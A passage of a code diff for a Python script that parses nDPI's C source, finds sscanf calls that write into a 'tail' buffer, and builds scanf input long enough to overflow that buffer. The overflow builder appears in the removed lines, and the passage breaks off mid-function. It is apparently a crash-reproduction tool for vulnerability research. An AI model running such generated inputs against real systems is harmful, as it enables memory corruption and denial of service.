@@ -1,518 +1,61 @@
 import os
 import re
 import tarfile
-import zipfile
-from typing import List, Tuple, Optional, Dict, Any
+from typing import List, Optional, Tuple, Dict, Any
 
 
-def _strip_c_comments(s: str) -> str:
-    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
-    s = re.sub(r"//[^\n]*", "", s)
-    return s
-
-
-def _find_matching(s: str, start: int, open_ch: str, close_ch: str) -> int:
-    depth = 0
-    i = start
-    in_str = False
-    in_chr = False
-    esc = False
-    while i < len(s):
-        c = s[i]
-        if in_str:
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == '"':
-                in_str = False
-        elif in_chr:
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == "'":
-                in_chr = False
-        else:
-            if c == '"':
-                in_str = True
-            elif c == "'":
-                in_chr = True
-            elif c == open_ch:
-                depth += 1
-            elif c == close_ch:
-                depth -= 1
-                if depth == 0:
-                    return i
-        i += 1
-    return -1
-
-
-def _split_c_args(arg_str: str) -> List[str]:
-    out = []
-    cur = []
-    depth_par = depth_br = depth_brk = 0
-    in_str = in_chr = False
-    esc = False
-
-    for c in arg_str:
-        if in_str:
-            cur.append(c)
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == '"':
-                in_str = False
-            continue
-        if in_chr:
-            cur.append(c)
-            if esc:
-                esc = False
-            elif c == "\\":
-                esc = True
-            elif c == "'":
-                in_chr = False
-            continue
-
-        if c == '"':
-            in_str = True
-            cur.append(c)
-        elif c == "'":
-            in_chr = True
-            cur.append(c)
-        elif c == "(":
-            depth_par += 1
-            cur.append(c)
-        elif c == ")":
-            depth_par -= 1
-            cur.append(c)
-        elif c == "{":
-            depth_br += 1
-            cur.append(c)
-        elif c == "}":
-            depth_br -= 1
-            cur.append(c)
-        elif c == "[":
-            depth_brk += 1
-            cur.append(c)
-        elif c == "]":
-            depth_brk -= 1
-            cur.append(c)
-        elif c == "," and depth_par == 0 and depth_br == 0 and depth_brk == 0:
-            out.append("".join(cur).strip())
-            cur = []
-        else:
-            cur.append(c)
-
-    if cur:
-        out.append("".join(cur).strip())
-    return [x for x in out if x != ""]
-
-
-def _parse_c_string_literal(s: str, start: int) -> Tuple[str, int]:
-    if start >= len(s) or s[start] != '"':
-        return "", start
-
-    def read_one(idx: int) -> Tuple[str, int]:
-        assert s[idx] == '"'
-        idx += 1
-        buf = []
-        while idx < len(s):
-            c = s[idx]
-            if c == '"':
-                idx += 1
-                break
-            if c == "\\" and idx + 1 < len(s):
-                n = s[idx + 1]
-                if n == "n":
-                    buf.append("\n")
-                    idx += 2
-                elif n == "t":
-                    buf.append("\t")
-                    idx += 2
-                elif n == "r":
-                    buf.append("\r")
-                    idx += 2
-                elif n == "0":
-                    # octal escape; parse up to 3 octal digits including this one
-                    j = idx + 1
-                    oct_digits = []
-                    while j < len(s) and len(oct_digits) < 3 and s[j] in "01234567":
-                        oct_digits.append(s[j])
-                        j += 1
-                    try:
-                        buf.append(chr(int("".join(oct_digits), 8)))
-                    except Exception:
-                        buf.append("\x00")
-                    idx = j
-                elif n == "x":
-                    j = idx + 2
-                    hex_digits = []
-                    while j < len(s) and len(hex_digits) < 2 and s[j] in "0123456789abcdefABCDEF":
-                        hex_digits.append(s[j])
-                        j += 1
-                    if hex_digits:
-                        try:
-                            buf.append(chr(int("".join(hex_digits), 16)))
-                        except Exception:
-                            buf.append("x")
-                    else:
-                        buf.append("x")
-                    idx = j
-                else:
-                    buf.append(n)
-                    idx += 2
-            else:
-                buf.append(c)
-                idx += 1
-        return "".join(buf), idx
-
-    parts = []
-    idx = start
-    val, idx = read_one(idx)
-    parts.append(val)
-    while True:
-        j = idx
-        while j < len(s) and s[j].isspace():
-            j += 1
-        if j < len(s) and s[j] == '"':
-            val2, j2 = read_one(j)
-            parts.append(val2)
-            idx = j2
-        else:
-            break
-    return "".join(parts), idx
-
-
-def _extract_function(text: str, func_name: str) -> Optional[str]:
-    pattern = re.compile(r"\b" + re.escape(func_name) + r"\s*\([^;{]*\)\s*\{", re.S)
-    m = pattern.search(text)
-    if not m:
-        return None
-    brace_pos = text.find("{", m.start())
-    if brace_pos < 0:
-        return None
-    end = _find_matching(text, brace_pos, "{", "}")
-    if end < 0:
-        return None
-    return text[m.start():end + 1]
-
-
-def _extract_tail_size(func_body: str) -> Tuple[Optional[int], Optional[str]]:
-    m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_body)
-    if m:
-        try:
-            return int(m.group(1)), None
-        except Exception:
-            pass
-    m2 = re.search(r"\bchar\s+tail\s*\[\s*([A-Za-z_][A-Za-z0-9_]*(?:\s*[\+\-\*/]\s*\d+|\s*)*)\s*\]", func_body)
-    if m2:
-        expr = m2.group(1).strip()
-        return None, expr
-    return None, None
-
-
-def _collect_macros(files: List[str]) -> Dict[str, str]:
-    macros: Dict[str, str] = {}
-    define_re = re.compile(r"^\s*#\s*define\s+([A-Za-z_][A-Za-z0-9_]*)\s+(.+?)\s*$")
-    for content in files:
-        for line in content.splitlines():
-            m = define_re.match(line)
-            if not m:
-                continue
-            name = m.group(1)
-            val = m.group(2)
-            if name and val:
-                macros[name] = val
-    return macros
-
-
-def _safe_eval_int_expr(expr: str) -> Optional[int]:
-    expr = expr.strip()
-    if not expr:
-        return None
-    expr = re.sub(r"\bsizeof\s*\([^)]*\)", "0", expr)
-    expr = re.sub(r"\b[A-Za-z_][A-Za-z0-9_]*\b", "0", expr)
-    if not re.fullmatch(r"[0-9\(\)\s\+\-\*/%<>&\|^~]+", expr):
+def _read_file_from_dir(root: str, target_basename: str) -> Optional[str]:
+    best_path = None
+    best_score = -1
+    for dirpath, _, filenames in os.walk(root):
+        if target_basename in filenames:
+            p = os.path.join(dirpath, target_basename)
+            score = 0
+            norm = p.replace("\\", "/").lower()
+            if "/src/lib/" in norm:
+                score += 50
+            if norm.endswith("/src/lib/" + target_basename.lower()):
+                score += 50
+            if "/lib/" in norm:
+                score += 10
+            score -= len(norm)
+            if score > best_score:
+                best_score = score
+                best_path = p
+    if not best_path:
         return None
     try:
-        v = eval(expr, {"__builtins__": None}, {})
-        if isinstance(v, int):
-            return v
+        with open(best_path, "rb") as f:
+            return f.read().decode("utf-8", errors="ignore")
     except Exception:
         return None
-    return None
 
 
-def _resolve_tail_size(expr: str, macros: Dict[str, str]) -> Optional[int]:
-    if expr is None:
-        return None
-    e = expr
-    for _ in range(8):
-        changed = False
-        for name, val in macros.items():
-            if re.search(r"\b" + re.escape(name) + r"\b", e):
-                e2 = re.sub(r"\b" + re.escape(name) + r"\b", f"({val})", e)
-                if e2 != e:
-                    e = e2
-                    changed = True
-        if not changed:
-            break
-    e = re.sub(r"/\*.*?\*/", "", e, flags=re.S)
-    e = re.sub(r"//[^\n]*", "", e)
-    e = e.strip()
-    return _safe_eval_int_expr(e)
-
-
-def _parse_format_conversions(fmt: str) -> List[Dict[str, Any]]:
-    convs = []
-    i = 0
-    while i < len(fmt):
-        if fmt[i] != "%":
-            i += 1
-            continue
-        if i + 1 < len(fmt) and fmt[i + 1] == "%":
-            i += 2
-            continue
-        start = i
-        i += 1
-        suppressed = False
-        if i < len(fmt) and fmt[i] == "*":
-            suppressed = True
-            i += 1
-        width = None
-        wstart = i
-        while i < len(fmt) and fmt[i].isdigit():
-            i += 1
-        if i > wstart:
-            try:
-                width = int(fmt[wstart:i])
-            except Exception:
-                width = None
-        if fmt.startswith("hh", i) or fmt.startswith("ll", i):
-            i += 2
-        elif i < len(fmt) and fmt[i] in "hljztLqI":
-            i += 1
-            if fmt.startswith("32", i) or fmt.startswith("64", i):
-                i += 2
-        if i >= len(fmt):
-            break
-        conv = fmt[i]
-        scanset = None
-        scanset_invert = None
-        if conv == "[":
-            i += 1
-            invert = False
-            if i < len(fmt) and fmt[i] == "^":
-                invert = True
-                i += 1
-            if i < len(fmt) and fmt[i] == "]":
-                i += 1
-            set_start = i
-            while i < len(fmt) and fmt[i] != "]":
-                i += 1
-            scanset = fmt[set_start:i]
-            scanset_invert = invert
-            if i < len(fmt) and fmt[i] == "]":
-                i += 1
-            conv = "["
-        else:
-            i += 1
-        end = i
-        convs.append({
-            "start": start,
-            "end": end,
-            "conv": conv,
-            "suppressed": suppressed,
-            "width": width,
-            "scanset": scanset,
-            "scanset_invert": scanset_invert
-        })
-    return convs
-
-
-def _choose_char_for_scanset(scanset: str, invert: bool) -> str:
-    if scanset is None:
-        return "A"
-    s = scanset
-
-    def in_set(ch: str) -> bool:
-        i = 0
-        while i < len(s):
-            if i + 2 < len(s) and s[i + 1] == "-" and s[i] != "\\" and s[i + 2] != "\\":
-                a = s[i]
-                b = s[i + 2]
-                if a <= ch <= b or b <= ch <= a:
-                    return True
-                i += 3
-            else:
-                if s[i] == ch:
-                    return True
-                i += 1
-        return False
-
-    if invert:
-        for ch in "A1B2C3D4E5F6G7H8I9J0":
-            if not in_set(ch) and not ch.isspace():
-                return ch
-        return "Z"
-    else:
-        for ch in "A1a0Z9b2c3d4e5f6g7":
-            if in_set(ch) and not ch.isspace():
-                return ch
-        i = 0
-        while i < len(s):
-            if i + 2 < len(s) and s[i + 1] == "-":
-                return s[i]
-            if not s[i].isspace():
-                return s[i]
-            i += 1
-        return "A"
-
-
-def _build_input_from_format(fmt: str, tail_conv_arg_index: int, overflow_len: int) -> str:
-    convs = _parse_format_conversions(fmt)
-
-    # map non-suppressed conversions to argument indices (0-based among varargs)
-    arg_map = []
-    for c in convs:
-        if c["conv"] == "%":
-            continue
-        if c["suppressed"]:
-            continue
-        arg_map.append(c)
-
-    if tail_conv_arg_index < 0 or tail_conv_arg_index >= len(arg_map):
-        tail_conv = None
-    else:
-        tail_conv = arg_map[tail_conv_arg_index]
-
-    def token_for_conv(c: Dict[str, Any], is_tail: bool) -> str:
-        conv = c["conv"]
-        width = c["width"]
-        if conv == "n":
-            return ""
-        if conv in ("d", "i", "u", "x", "X", "o"):
-            return "1"
-        if conv in ("f", "F", "g", "G", "e", "E", "a", "A"):
-            return "1"
-        if conv == "p":
-            return "0"
-        if conv == "c":
-            w = width if isinstance(width, int) and width > 0 else 1
-            ch = "A"
-            if is_tail:
-                # %c doesn't null-terminate; but shouldn't be used for tail; still make it long
-                w = max(w, overflow_len)
-            return ch * w
-        if conv in ("s", "["):
-            if is_tail:
-                if overflow_len <= 0:
-                    overflow_len2 = 64
-                else:
-                    overflow_len2 = overflow_len
-                if conv == "[":
-                    ch = _choose_char_for_scanset(c.get("scanset"), bool(c.get("scanset_invert")))
-                    return ch * overflow_len2
-                return "A" * overflow_len2
-            else:
-                if conv == "[":
-                    ch = _choose_char_for_scanset(c.get("scanset"), bool(c.get("scanset_invert")))
-                    return ch
-                return "A"
-        # unknown conv: give something non-empty
-        return "A"
-
-    out = []
-    pos = 0
-    tail_set = set()
-    if tail_conv is not None:
-        tail_set.add(id(tail_conv))
-
-    # Need to generate by walking through format string and replacing conversion specs with tokens
-    non_supp_arg_idx = -1
-    i = 0
-    while i < len(fmt):
-        if fmt[i] == "%":
-            if i + 1 < len(fmt) and fmt[i + 1] == "%":
-                out.append("%")
-                i += 2
-                continue
-            # parse conversion spec to match convs list
-            # find current conv entry starting at i
-            match = None
-            for c in convs:
-                if c["start"] == i:
-                    match = c
-                    break
-            if match is None:
-                # fallback: skip '%'
-                i += 1
-                continue
-            literal_part = ""
-            # no literal part to add here; handled in normal flow
-            i2 = match["end"]
-            if not match["suppressed"]:
-                non_supp_arg_idx += 1
-            is_tail = (not match["suppressed"]) and (non_supp_arg_idx == tail_conv_arg_index)
-            out.append(token_for_conv(match, is_tail))
-            i = i2
-        else:
-            if fmt[i].isspace():
-                # any whitespace in format consumes any amount; output single space for separation
-                if not out or (out and out[-1] and not out[-1].endswith(" ")):
-                    out.append(" ")
-                i += 1
-                while i < len(fmt) and fmt[i].isspace():
-                    i += 1
-            else:
-                out.append(fmt[i])
-                i += 1
-
-    s = "".join(out)
-    s = re.sub(r" +", " ", s).strip()
-    return s
-
-
-def _read_text_from_archive(src_path: str, member_suffix: str) -> Optional[str]:
-    if os.path.isdir(src_path):
-        for root, _, files in os.walk(src_path):
-            for fn in files:
-                if fn == os.path.basename(member_suffix) and os.path.join(root, fn).endswith(member_suffix):
-                    try:
-                        with open(os.path.join(root, fn), "rb") as f:
-                            return f.read().decode("utf-8", errors="ignore")
-                    except Exception:
-                        return None
-        p = os.path.join(src_path, member_suffix)
-        if os.path.exists(p):
-            try:
-                with open(p, "rb") as f:
-                    return f.read().decode("utf-8", errors="ignore")
-            except Exception:
-                return None
-        return None
-
-    if zipfile.is_zipfile(src_path):
-        try:
-            with zipfile.ZipFile(src_path, "r") as zf:
-                candidates = [n for n in zf.namelist() if n.endswith(member_suffix)]
-                if not candidates:
-                    return None
-                name = sorted(candidates, key=len)[0]
-                return zf.read(name).decode("utf-8", errors="ignore")
-        except Exception:
-            return None
-
+def _read_file_from_tar(tar_path: str, target_basename: str) -> Optional[str]:
     try:
-        with tarfile.open(src_path, "r:*") as tf:
-            candidates = [m for m in tf.getmembers() if m.name.endswith(member_suffix)]
-            if not candidates:
+        with tarfile.open(tar_path, "r:*") as tf:
+            best_member = None
+            best_score = -1
+            for m in tf.getmembers():
+                name = m.name.replace("\\", "/")
+                if not name.lower().endswith("/" + target_basename.lower()):
+                    continue
+                norm = name.lower()
+                score = 0
+                if "/src/lib/" in norm:
+                    score += 50
+                if norm.endswith("/src/lib/" + target_basename.lower()):
+                    score += 50
+                if "/lib/" in norm:
+                    score += 10
+                score -= len(norm)
+                if score > best_score:
+                    best_score = score
+                    best_member = m
+            if not best_member:
                 return None
-            m = sorted(candidates, key=lambda x: len(x.name))[0]
-            f = tf.extractfile(m)
-            if f is None:
+            f = tf.extractfile(best_member)
+            if not f:
                 return None
             data = f.read()
             return data.decode("utf-8", errors="ignore")
@@ -520,165 +63,963 @@ def _read_text_from_archive(src_path: str, member_suffix: str) -> Optional[str]:
         return None
 
 
-def _read_many_texts_from_archive(src_path: str, suffixes: List[str]) -> List[str]:
-    out = []
+def _read_ndpi_main(src_path: str) -> Optional[str]:
     if os.path.isdir(src_path):
-        for suf in suffixes:
-            t = _read_text_from_archive(src_path, suf)
-            if t is not None:
-                out.append(t)
-        return out
+        return _read_file_from_dir(src_path, "ndpi_main.c")
+    return _read_file_from_tar(src_path, "ndpi_main.c")
 
-    if zipfile.is_zipfile(src_path):
+
+def _c_unescape(s: str) -> str:
+    out = []
+    i = 0
+    n = len(s)
+    while i < n:
+        c = s[i]
+        if c != "\\":
+            out.append(c)
+            i += 1
+            continue
+        i += 1
+        if i >= n:
+            out.append("\\")
+            break
+        esc = s[i]
+        i += 1
+        if esc == "n":
+            out.append("\n")
+        elif esc == "r":
+            out.append("\r")
+        elif esc == "t":
+            out.append("\t")
+        elif esc == "v":
+            out.append("\v")
+        elif esc == "b":
+            out.append("\b")
+        elif esc == "f":
+            out.append("\f")
+        elif esc == "a":
+            out.append("\a")
+        elif esc == "\\":
+            out.append("\\")
+        elif esc == '"':
+            out.append('"')
+        elif esc == "'":
+            out.append("'")
+        elif esc == "?":
+            out.append("?")
+        elif esc == "0" or ("0" <= esc <= "7"):
+            oct_digits = [esc]
+            for _ in range(2):
+                if i < n and "0" <= s[i] <= "7":
+                    oct_digits.append(s[i])
+                    i += 1
+                else:
+                    break
+            try:
+                out.append(chr(int("".join(oct_digits), 8) & 0xFF))
+            except Exception:
+                out.append("".join(oct_digits))
+        elif esc == "x":
+            hex_digits = []
+            while i < n and s[i] in "0123456789abcdefABCDEF":
+                hex_digits.append(s[i])
+                i += 1
+            if hex_digits:
+                try:
+                    out.append(chr(int("".join(hex_digits), 16) & 0xFF))
+                except Exception:
+                    out.append("x" + "".join(hex_digits))
+            else:
+                out.append("x")
+        else:
+            out.append(esc)
+    return "".join(out)
+
+
+def _extract_c_string_literals(expr: str) -> str:
+    res = []
+    i = 0
+    n = len(expr)
+    in_line_comment = False
+    in_block_comment = False
+    in_char = False
+    while i < n:
+        c = expr[i]
+        if in_line_comment:
+            if c == "\n":
+                in_line_comment = False
+            i += 1
+            continue
+        if in_block_comment:
+            if c == "*" and i + 1 < n and expr[i + 1] == "/":
+                in_block_comment = False
+                i += 2
+            else:
+                i += 1
+            continue
+        if in_char:
+            if c == "\\":
+                i += 2
+            elif c == "'":
+                in_char = False
+                i += 1
+            else:
+                i += 1
+            continue
+        if c == "/" and i + 1 < n:
+            n2 = expr[i + 1]
+            if n2 == "/":
+                in_line_comment = True
+                i += 2
+                continue
+            if n2 == "*":
+                in_block_comment = True
+                i += 2
+                continue
+        if c == "'":
+            in_char = True
+            i += 1
+            continue
+        if c == '"':
+            i += 1
+            start = i
+            buf = []
+            while i < n:
+                cc = expr[i]
+                if cc == "\\":
+                    if i + 1 < n:
+                        buf.append(expr[i])
+                        buf.append(expr[i + 1])
+                        i += 2
+                    else:
+                        buf.append("\\")
+                        i += 1
+                elif cc == '"':
+                    break
+                else:
+                    buf.append(cc)
+                    i += 1
+            res.append(_c_unescape("".join(buf)))
+            if i < n and expr[i] == '"':
+                i += 1
+            continue
+        if c == "L" and i + 1 < n and expr[i + 1] == '"':
+            i += 1
+            continue
+        i += 1
+    return "".join(res)
+
+
+def _build_string_define_map(text: str) -> Dict[str, str]:
+    defines: Dict[str, str] = {}
+    lines = text.splitlines(True)
+    i = 0
+    n = len(lines)
+    while i < n:
+        line = lines[i]
+        m = re.match(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$', line)
+        if not m:
+            i += 1
+            continue
+        name = m.group(1)
+        rest = m.group(2).rstrip("\n")
+        while rest.rstrip().endswith("\\") and i + 1 < n:
+            rest = rest.rstrip()
+            rest = rest[:-1] + lines[i + 1].rstrip("\n")
+            i += 1
+        s = _extract_c_string_literals(rest)
+        if s:
+            defines[name] = s
+        i += 1
+    return defines
+
+
+def _extract_function(text: str, func_name: str) -> Optional[str]:
+    idx = 0
+    n = len(text)
+    in_line_comment = False
+    in_block_comment = False
+    in_str = False
+    in_char = False
+    while idx < n:
+        c = text[idx]
+        if in_line_comment:
+            if c == "\n":
+                in_line_comment = False
+            idx += 1
+            continue
+        if in_block_comment:
+            if c == "*" and idx + 1 < n and text[idx + 1] == "/":
+                in_block_comment = False
+                idx += 2
+            else:
+                idx += 1
+            continue
+        if in_str:
+            if c == "\\":
+                idx += 2
+            elif c == '"':
+                in_str = False
+                idx += 1
+            else:
+                idx += 1
+            continue
+        if in_char:
+            if c == "\\":
+                idx += 2
+            elif c == "'":
+                in_char = False
+                idx += 1
+            else:
+                idx += 1
+            continue
+        if c == "/" and idx + 1 < n:
+            if text[idx + 1] == "/":
+                in_line_comment = True
+                idx += 2
+                continue
+            if text[idx + 1] == "*":
+                in_block_comment = True
+                idx += 2
+                continue
+        if c == '"':
+            in_str = True
+            idx += 1
+            continue
+        if c == "'":
+            in_char = True
+            idx += 1
+            continue
+
+        if text.startswith(func_name, idx):
+            pre = text[idx - 1] if idx > 0 else " "
+            post = text[idx + len(func_name)] if idx + len(func_name) < n else " "
+            if (pre.isalnum() or pre == "_") or (post.isalnum() or post == "_"):
+                idx += len(func_name)
+                continue
+            j = idx + len(func_name)
+            while j < n and text[j].isspace():
+                j += 1
+            if j >= n or text[j] != "(":
+                idx += len(func_name)
+                continue
+            par = 0
+            k = j
+            in_s2 = False
+            in_c2 = False
+            in_lc2 = False
+            in_bc2 = False
+            while k < n:
+                ch = text[k]
+                if in_lc2:
+                    if ch == "\n":
+                        in_lc2 = False
+                    k += 1
+                    continue
+                if in_bc2:
+                    if ch == "*" and k + 1 < n and text[k + 1] == "/":
+                        in_bc2 = False
+                        k += 2
+                    else:
+                        k += 1
+                    continue
+                if in_s2:
+                    if ch == "\\":
+                        k += 2
+                    elif ch == '"':
+                        in_s2 = False
+                        k += 1
+                    else:
+                        k += 1
+                    continue
+                if in_c2:
+                    if ch == "\\":
+                        k += 2
+                    elif ch == "'":
+                        in_c2 = False
+                        k += 1
+                    else:
+                        k += 1
+                    continue
+                if ch == "/" and k + 1 < n:
+                    if text[k + 1] == "/":
+                        in_lc2 = True
+                        k += 2
+                        continue
+                    if text[k + 1] == "*":
+                        in_bc2 = True
+                        k += 2
+                        continue
+                if ch == '"':
+                    in_s2 = True
+                    k += 1
+                    continue
+                if ch == "'":
+                    in_c2 = True
+                    k += 1
+                    continue
+                if ch == "(":
+                    par += 1
+                elif ch == ")":
+                    par -= 1
+                    if par == 0:
+                        k += 1
+                        break
+                k += 1
+            if par != 0:
+                idx += len(func_name)
+                continue
+            while k < n and text[k].isspace():
+                k += 1
+            if k >= n or text[k] != "{":
+                idx += len(func_name)
+                continue
+            brace = 0
+            start = k
+            t = k
+            in_s3 = False
+            in_c3 = False
+            in_lc3 = False
+            in_bc3 = False
+            while t < n:
+                ch = text[t]
+                if in_lc3:
+                    if ch == "\n":
+                        in_lc3 = False
+                    t += 1
+                    continue
+                if in_bc3:
+                    if ch == "*" and t + 1 < n and text[t + 1] == "/":
+                        in_bc3 = False
+                        t += 2
+                    else:
+                        t += 1
+                    continue
+                if in_s3:
+                    if ch == "\\":
+                        t += 2
+                    elif ch == '"':
+                        in_s3 = False
+                        t += 1
+                    else:
+                        t += 1
+                    continue
+                if in_c3:
+                    if ch == "\\":
+                        t += 2
+                    elif ch == "'":
+                        in_c3 = False
+                        t += 1
+                    else:
+                        t += 1
+                    continue
+                if ch == "/" and t + 1 < n:
+                    if text[t + 1] == "/":
+                        in_lc3 = True
+                        t += 2
+                        continue
+                    if text[t + 1] == "*":
+                        in_bc3 = True
+                        t += 2
+                        continue
+                if ch == '"':
+                    in_s3 = True
+                    t += 1
+                    continue
+                if ch == "'":
+                    in_c3 = True
+                    t += 1
+                    continue
+                if ch == "{":
+                    brace += 1
+                elif ch == "}":
+                    brace -= 1
+                    if brace == 0:
+                        t += 1
+                        return text[start:t]
+                t += 1
+            return text[start:]
+        idx += 1
+    return None
+
+
+def _extract_calls(text: str, func: str) -> List[str]:
+    calls: List[str] = []
+    n = len(text)
+    i = 0
+    in_line_comment = False
+    in_block_comment = False
+    in_str = False
+    in_char = False
+    while i < n:
+        c = text[i]
+        if in_line_comment:
+            if c == "\n":
+                in_line_comment = False
+            i += 1
+            continue
+        if in_block_comment:
+            if c == "*" and i + 1 < n and text[i + 1] == "/":
+                in_block_comment = False
+                i += 2
+            else:
+                i += 1
+            continue
+        if in_str:
+            if c == "\\":
+                i += 2
+            elif c == '"':
+                in_str = False
+                i += 1
+            else:
+                i += 1
+            continue
+        if in_char:
+            if c == "\\":
+                i += 2
+            elif c == "'":
+                in_char = False
+                i += 1
+            else:
+                i += 1
+            continue
+
+        if c == "/" and i + 1 < n:
+            if text[i + 1] == "/":
+                in_line_comment = True
+                i += 2
+                continue
+            if text[i + 1] == "*":
+                in_block_comment = True
+                i += 2
+                continue
+        if c == '"':
+            in_str = True
+            i += 1
+            continue
+        if c == "'":
+            in_char = True
+            i += 1
+            continue
+
+        if text.startswith(func, i):
+            pre = text[i - 1] if i > 0 else " "
+            post = text[i + len(func)] if i + len(func) < n else " "
+            if (pre.isalnum() or pre == "_") or (post.isalnum() or post == "_"):
+                i += len(func)
+                continue
+            j = i + len(func)
+            while j < n and text[j].isspace():
+                j += 1
+            if j >= n or text[j] != "(":
+                i += len(func)
+                continue
+            open_pos = j
+            par = 0
+            k = open_pos
+            in_s2 = False
+            in_c2 = False
+            in_lc2 = False
+            in_bc2 = False
+            while k < n:
+                ch = text[k]
+                if in_lc2:
+                    if ch == "\n":
+                        in_lc2 = False
+                    k += 1
+                    continue
+                if in_bc2:
+                    if ch == "*" and k + 1 < n and text[k + 1] == "/":
+                        in_bc2 = False
+                        k += 2
+                    else:
+                        k += 1
+                    continue
+                if in_s2:
+                    if ch == "\\":
+                        k += 2
+                    elif ch == '"':
+                        in_s2 = False
+                        k += 1
+                    else:
+                        k += 1
+                    continue
+                if in_c2:
+                    if ch == "\\":
+                        k += 2
+                    elif ch == "'":
+                        in_c2 = False
+                        k += 1
+                    else:
+                        k += 1
+                    continue
+                if ch == "/" and k + 1 < n:
+                    if text[k + 1] == "/":
+                        in_lc2 = True
+                        k += 2
+                        continue
+                    if text[k + 1] == "*":
+                        in_bc2 = True
+                        k += 2
+                        continue
+                if ch == '"':
+                    in_s2 = True
+                    k += 1
+                    continue
+                if ch == "'":
+                    in_c2 = True
+                    k += 1
+                    continue
+                if ch == "(":
+                    par += 1
+                elif ch == ")":
+                    par -= 1
+                    if par == 0:
+                        k += 1
+                        break
+                k += 1
+            if par == 0:
+                calls.append(text[i:k])
+                i = k
+                continue
+        i += 1
+    return calls
+
+
+def _split_top_level_args(arglist: str) -> List[str]:
+    args: List[str] = []
+    n = len(arglist)
+    i = 0
+    start = 0
+    depth_par = 0
+    depth_br = 0
+    depth_sq = 0
+    in_str = False
+    in_char = False
+    in_line_comment = False
+    in_block_comment = False
+
+    def flush(end: int) -> None:
+        s = arglist[start:end].strip()
+        if s:
+            args.append(s)
+
+    while i < n:
+        c = arglist[i]
+        if in_line_comment:
+            if c == "\n":
+                in_line_comment = False
+            i += 1
+            continue
+        if in_block_comment:
+            if c == "*" and i + 1 < n and arglist[i + 1] == "/":
+                in_block_comment = False
+                i += 2
+            else:
+                i += 1
+            continue
+        if in_str:
+            if c == "\\":
+                i += 2
+            elif c == '"':
+                in_str = False
+                i += 1
+            else:
+                i += 1
+            continue
+        if in_char:
+            if c == "\\":
+                i += 2
+            elif c == "'":
+                in_char = False
+                i += 1
+            else:
+                i += 1
+            continue
+
+        if c == "/" and i + 1 < n:
+            if arglist[i + 1] == "/":
+                in_line_comment = True
+                i += 2
+                continue
+            if arglist[i + 1] == "*":
+                in_block_comment = True
+                i += 2
+                continue
+        if c == '"':
+            in_str = True
+            i += 1
+            continue
+        if c == "'":
+            in_char = True
+            i += 1
+            continue
+
+        if c == "(":
+            depth_par += 1
+        elif c == ")":
+            if depth_par > 0:
+                depth_par -= 1
+        elif c == "{":
+            depth_br += 1
+        elif c == "}":
+            if depth_br > 0:
+                depth_br -= 1
+        elif c == "[":
+            depth_sq += 1
+        elif c == "]":
+            if depth_sq > 0:
+                depth_sq -= 1
+        elif c == "," and depth_par == 0 and depth_br == 0 and depth_sq == 0:
+            flush(i)
+            i += 1
+            start = i
+            continue
+        i += 1
+
+    flush(n)
+    return args
+
+
+def _get_call_args(call_text: str) -> Optional[List[str]]:
+    p = call_text.find("(")
+    if p < 0:
+        return None
+    inner = call_text[p + 1:]
+    if inner.endswith(")"):
+        inner = inner[:-1]
+    return _split_top_level_args(inner)
+
+
+def _clean_c_expr(expr: str) -> str:
+    s = expr.strip()
+    prev = None
+    while prev != s:
+        prev = s
+        s = s.strip()
+        s = re.sub(r'^\(\s*[^()]*\)\s*', '', s)
+        s = s.strip()
+        if s.startswith("&"):
+            s = s[1:].strip()
+        if s.startswith("*"):
+            s = s[1:].strip()
+        if s.startswith("(") and s.endswith(")"):
+            s2 = s[1:-1].strip()
+            if s2:
+                s = s2
+    return s.strip()
+
+
+def _find_tail_arg_index(args: List[str]) -> Optional[int]:
+    for idx in range(2, len(args)):
+        a = _clean_c_expr(args[idx])
+        if re.fullmatch(r'tail(\s*\[[^\]]+\])?', a):
+            return idx
+        if re.search(r'\btail\b', a):
+            if a == "tail" or a.endswith("tail") or a.startswith("tail"):
+                return idx
+    return None
+
+
+def _parse_int_literal(s: str) -> Optional[int]:
+    s = s.strip()
+    m = re.fullmatch(r'(\d+)', s)
+    if m:
         try:
-            with zipfile.ZipFile(src_path, "r") as zf:
-                names = zf.namelist()
-                for suf in suffixes:
-                    cand = [n for n in names if n.endswith(suf)]
-                    if cand:
-                        name = sorted(cand, key=len)[0]
-                        out.append(zf.read(name).decode("utf-8", errors="ignore"))
+            return int(m.group(1))
+        except Exception:
+            return None
+    m = re.fullmatch(r'(0x[0-9a-fA-F]+)', s)
+    if m:
+        try:
+            return int(m.group(1), 16)
+        except Exception:
+            return None
+    return None
+
+
+def _find_tail_buffer_size(func_text: str, full_text: str, defines: Dict[str, str]) -> int:
+    m = re.search(r'\btail\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', func_text)
+    if not m:
+        m = re.search(r'\bchar\s+tail\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]', full_text)
+    if not m:
+        return 32
+    tok = m.group(1)
+    v = _parse_int_literal(tok)
+    if v is not None and v > 0:
+        return v
+    m2 = re.search(r'^\s*#\s*define\s+' + re.escape(tok) + r'\s+(\d+)\b', full_text, flags=re.M)
+    if m2:
+        try:
+            v2 = int(m2.group(1))
+            if v2 > 0:
+                return v2
         except Exception:
             pass
-        return out
-
-    try:
-        with tarfile.open(src_path, "r:*") as tf:
-            members = tf.getmembers()
-            for suf in suffixes:
-                cand = [m for m in members if m.name.endswith(suf)]
-                if not cand:
-                    continue
-                m = sorted(cand, key=lambda x: len(x.name))[0]
-                f = tf.extractfile(m)
-                if f is None:
-                    continue
-                out.append(f.read().decode("utf-8", errors="ignore"))
-    except Exception:
-        pass
-    return out
+    return 32
 
 
-def _find_sscanf_calls_with_tail(func_body: str) -> List[Dict[str, Any]]:
-    calls = []
-    # scan for "sscanf(" and "__isoc99_sscanf("
-    for m in re.finditer(r"\b(?:__isoc99_sscanf|sscanf)\s*\(", func_body):
-        start = m.start()
-        paren_pos = func_body.find("(", m.end() - 1)
-        if paren_pos < 0:
+def _parse_scanset(raw: str) -> Tuple[bool, str]:
+    if raw.startswith("^"):
+        return True, raw[1:]
+    return False, raw
+
+
+def _is_char_in_scanset(ch: str, charset: str) -> bool:
+    i = 0
+    n = len(charset)
+    last = None
+    while i < n:
+        c = charset[i]
+        if c == "-" and last is not None and i + 1 < n:
+            nxt = charset[i + 1]
